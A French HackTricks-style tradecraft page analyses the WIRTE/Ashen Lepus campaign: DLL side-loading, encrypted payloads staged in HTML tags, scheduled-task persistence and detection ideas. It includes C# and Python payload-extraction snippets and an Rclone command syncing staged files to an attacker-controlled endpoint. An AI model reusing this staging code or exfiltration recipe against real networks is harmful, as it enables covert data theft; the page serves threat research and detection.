# Avancé DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) a exploité un schéma répétable qui enchaîne DLL sideloading, staged HTML payloads et backdoors .NET modulaires pour persister au sein de réseaux diplomatiques du Moyen-Orient. La technique est réutilisable par n'importe quel opérateur car elle repose sur :

- **Archive-based social engineering**: des PDFs bénins instruisent les cibles de récupérer une archive RAR depuis un site de partage de fichiers. L'archive contient un EXE visionneur de documents réaliste, une DLL malveillante nommée d'après une bibliothèque de confiance (p.ex. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), et un leurre `Document.pdf`.
- **DLL search order abuse**: la victime double-clique sur l'EXE, Windows résout l'import de la DLL depuis le répertoire courant, et le loader malveillant (AshenLoader) s'exécute dans le processus de confiance pendant que le PDF leurre s'ouvre pour éviter les soupçons.
- **Living-off-the-land staging**: chaque étape ultérieure (AshenStager → AshenOrchestrator → modules) reste hors disque jusqu'à ce qu'elle soit nécessaire, livrée comme des blobs chiffrés cachés à l'intérieur de réponses HTML par ailleurs inoffensives.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: l'EXE side-loads AshenLoader, qui effectue de la reconnaissance de l'hôte, chiffre son contenu en AES-CTR, et le POSTe dans des paramètres tournants tels que `token=`, `id=`, `q=`, ou `auth=` vers des chemins ressemblant à des API (p.ex. `/api/v2/account`).
2. **HTML extraction**: le C2 ne révèle la prochaine étape que lorsque l'IP client géolocalise dans la région ciblée et que le `User-Agent` correspond à l'implant, ce qui met en échec les sandboxes. Quand les vérifications passent, le corps HTTP contient un blob `<headerp>...</headerp>` avec le payload AshenStager chiffré en Base64/AES-CTR.
3. **Second sideload**: AshenStager est déployé avec un autre binaire légitime qui importe `wtsapi32.dll`. La copie malveillante injectée dans le binaire récupère plus d'HTML, cette fois en découpant `<article>...</article>` pour récupérer AshenOrchestrator.
4. **AshenOrchestrator**: un contrôleur .NET modulaire qui décode une config JSON en Base64. Les champs `tg` et `au` de la config sont concaténés/hashés pour former la clé AES, qui déchiffre `xrk`. Les octets résultants servent de clé XOR pour chaque blob de module récupéré ensuite.
5. **Module delivery**: chaque module est décrit via des commentaires HTML qui redirigent le parseur vers une balise arbitraire, contournant les règles statiques qui ne regardent que `<headerp>` ou `<article>`. Les modules incluent la persistance (`PR*`), les uninstallers (`UN*`), la reconnaissance (`SN`), la capture d'écran (`SCT`) et l'exploration de fichiers (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Même si les défenseurs bloquent ou suppriment un élément spécifique, l'opérateur n'a qu'à changer la balise indiquée dans le commentaire HTML pour reprendre la livraison.

### Assistant d'extraction rapide (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Parallèles d'évasion HTML Staging

La recherche récente sur HTML smuggling (Talos) met en évidence des payloads cachés en tant que chaînes Base64 à l'intérieur de blocs `<script>` dans des pièces jointes HTML et décodés via JavaScript à l'exécution. La même astuce peut être réutilisée pour les réponses C2 : mettre en scène des blobs chiffrés à l'intérieur d'une balise script (ou autre élément DOM) et les décoder en mémoire avant AES/XOR, faisant paraître la page comme un HTML ordinaire. Talos montre aussi une obfuscation en couches (renommage d'identifiants plus Base64/Caesar/AES) à l'intérieur des balises script, ce qui se transpose proprement aux blobs C2 mis en scène par HTML.

## Notes sur les variantes récentes (2024-2025)

- Check Point a observé des campagnes WIRTE en 2024 qui reposaient toujours sur du sideloading basé sur des archives mais utilisaient `propsys.dll` (stagerx64) comme première étape. Le stager décode la charge suivante avec Base64 + XOR (clé `53`), envoie des requêtes HTTP avec un `User-Agent` en dur, et extrait des blobs chiffrés intégrés entre des balises HTML. Dans une branche, l'étape a été reconstruit à partir d'une longue liste de chaînes d'IP intégrées décodées via `RtlIpv4StringToAddressA`, puis concaténées dans les octets du payload.
- OWN-CERT a documenté des outils WIRTE antérieurs où le dropper chargé via sideload `wtsapi32.dll` protégeait les chaînes avec Base64 + TEA et utilisait le nom du DLL lui-même comme clé de déchiffrement, puis obfusquait les données d'identification de l'hôte via XOR/Base64 avant de les envoyer au C2.

## Crypto & C2 Hardening

- **AES-CTR everywhere** : les loaders actuels embarquent des clés 256 bits plus nonces (par ex. `{9a 20 51 98 ...}`) et ajoutent optionnellement une couche XOR en utilisant des chaînes telles que `msasn1.dll` avant/après le déchiffrement.
- **Key material variations** : des loaders antérieurs utilisaient Base64 + TEA pour protéger les chaînes embarquées, la clé de déchiffrement étant dérivée du nom du DLL malveillant (par ex. `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage** : les serveurs de staging sont séparés par outil, hébergés sur différents ASN, et parfois présentés via des sous-domaines à apparence légitime, de sorte que compromettre une étape n'expose pas le reste.
- **Recon smuggling** : les données énumérées incluent maintenant les listings Program Files pour repérer les applis à forte valeur et sont toujours chiffrées avant de quitter l'hôte.
- **URI churn** : les paramètres de requête et les chemins REST tournent entre les campagnes (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidant des détections fragiles.
- **User-Agent pinning + safe redirects** : l'infrastructure C2 ne répond qu'à des chaînes UA exactes et, sinon, redirige vers des sites d'actualité/santé bénins pour se fondre dans le trafic.
- **Gated delivery** : les serveurs sont géo-restreints et ne répondent qu'aux implants réels. Les clients non approuvés reçoivent un HTML non suspect.

## Persistance et boucle d'exécution

AshenStager installe des scheduled tasks qui se font passer pour des tâches de maintenance Windows et s'exécutent via `svchost.exe`, par ex. :

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ces tâches relancent la chaîne de sideloading au démarrage ou à intervalles réguliers, garantissant qu'AshenOrchestrator peut demander des modules frais sans toucher au disque à nouveau.

## Utilisation de clients de synchronisation bénins pour l'exfiltration

Les opérateurs mettent en scène des documents diplomatiques dans `C:\Users\Public` (lisible par tous et non suspect) via un module dédié, puis téléchargent le binaire légitime [Rclone](https://rclone.org/) pour synchroniser ce répertoire avec un stockage contrôlé par l'attaquant. Unit42 note que c'est la première fois que cet acteur est observé utilisant Rclone pour l'exfiltration, ce qui s'aligne sur la tendance générale d'abuser d'outils de sync légitimes pour se fondre dans le trafic normal :

1. Stage : copy/collect target files into `C:\Users\Public\{campaign}\`.
2. Configure : ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. Sync : run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Parce que Rclone est largement utilisé pour des workflows de sauvegarde légitimes, les défenseurs doivent se concentrer sur des exécutions anormales (nouveaux binaires, remotes suspects, ou synchronisations subites de `C:\Users\Public`).

## Axes de détection

- Alerter sur des processus signés qui chargent de manière inattendue des DLL depuis des chemins modifiables par l'utilisateur (filtres Procmon + `Get-ProcessMitigation -Module`), en particulier quand les noms de DLL recoupent `netutils`, `srvcli`, `dwampi`, ou `wtsapi32`.
- Inspecter les réponses HTTPS suspectes pour des **large Base64 blobs embedded inside unusual tags** ou protégés par des commentaires `<!-- TAG: <xyz> -->`.
- Étendre la chasse HTML aux **Base64 strings inside `<script>` blocks** (style HTML smuggling staging) qui sont décodées via JavaScript avant le traitement AES/XOR.
- Rechercher des **scheduled tasks** qui exécutent `svchost.exe` avec des arguments non liés aux services ou qui pointent vers des répertoires de dropper.
- Suivre les **C2 redirects** qui ne retournent des payloads que pour des chaînes `User-Agent` exactes et qui, sinon, renvoient vers des domaines d'actualité/santé légitimes.
- Surveiller l'apparition de binaires **Rclone** en dehors des emplacements gérés par l'IT, de nouveaux fichiers `rclone.conf`, ou des jobs de sync tirant depuis des répertoires de staging comme `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
